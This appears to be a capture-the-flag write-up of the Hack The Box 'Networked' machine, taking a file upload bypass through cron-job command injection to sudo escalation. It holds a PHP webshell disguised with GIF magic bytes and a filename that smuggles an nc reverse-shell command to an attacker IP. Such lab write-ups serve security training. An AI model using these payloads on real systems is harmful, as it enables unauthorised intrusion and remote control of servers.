---
layout: single
title: Networked - Hack The Box
excerpt: "Networked is an Easy difficulty Linux box vulnerable to file upload bypass, leading to code execution. Due to improper sanitization, a crontab running as the user can be exploited to achieve command execution. The user has privileges to execute a network configuration script, which can be leveraged to execute commands as root."
date: 2025-05-30
classes: wide
header:
  teaser: /img2/networked.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Information Leakage
  - PHP Source Code Analysis
  - Abusing File Upload (AddHandler Exploitation) [RCE]
  - Abusing Cron Job [Command Injection] (User Pivoting)
  - Abusing Sudoers Privilege (Custom Script Exploitation) [Privilege Escalation]
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.146
```

![](/img2/Pasted%20image%2020250530093957.png)

- Whatweb

```bash
whatweb http://10.10.10.146/
```

![](/img2/Pasted%20image%2020250530094128.png)

- Gobuster

```bash
gobuster dir -u http://10.10.10.146/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

![](/img2/Pasted%20image%2020250530104755.png)

- Download backup.tar

![](/img2/Pasted%20image%2020250530104908.png)

```bash
7z x backup.tar
```

- Check php files

![](/img2/Pasted%20image%2020250530105307.png)

![](/img2/Pasted%20image%2020250530105348.png)

![[Pasted image 20250531134313.png]]

> To bypass this restriction, the last extension need to be ".jpg, .png, .gif, .jpeg" so we can upload doble extension like "test.php.png".  

![](/img2/Pasted%20image%2020250530110305.png)

>We need to upload image file to bypass MIME library. To upload "real" image we need to have image Content-Type and first bytes

```bash
echo '<?php system("whoami")?>' > cmd.php
```

```bash
xxd cmd.php
```

![](/img2/Pasted%20image%2020250530110744.png)

```bash
file cmd.php
```

![](/img2/Pasted%20image%2020250530110919.png)

> To detect file type the MIME library check first bytes, so we need to change it

```bash
echo 'GIF8;\n<?php system("whoami")?>' > cmd.php
```

```bash
xxd cmd.php
```

![](/img2/Pasted%20image%2020250530111042.png)

```bash
file cmd.php
```

![](/img2/Pasted%20image%2020250530111146.png)

> Now, MIME will detect file as GIF

## Exploitation

- Abusing File Upload (Doble extension)

![](/img2/Pasted%20image%2020250530111317.png)

![](/img2/Pasted%20image%2020250530111344.png)

> Usually, apache shouldn´t execute php code in doble extension files, but in this case we can run php code. 

- Send revese shell

![](/img2/Pasted%20image%2020250530111623.png)

```bash
nc -nlvp 9000
```

## Post-exploitation

- Abusing cron job

```bash
cat /home/guly/crontab.guly
```

![](/img2/Pasted%20image%2020250530132027.png)

- Check check_attack.php 

```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

> This script detects new files in /var/www/html/uploads/ and run rm -f FILE, so we can change the name of script to send a reverse shell.

- Pivoting

```bash
touch 'test.txt;nc -c bash 10.10.16.7 9002'
```

```bash
nc -nvlp 9002
```

- Check sudoers

```bash
sudo -l
```

![](/img2/Pasted%20image%2020250531140948.png)

```
sudo /usr/local/sbin/changename.sh
```

![](/img2/Pasted%20image%2020250531141424.png)


![](/img2/Pasted%20image%2020250530131751.png)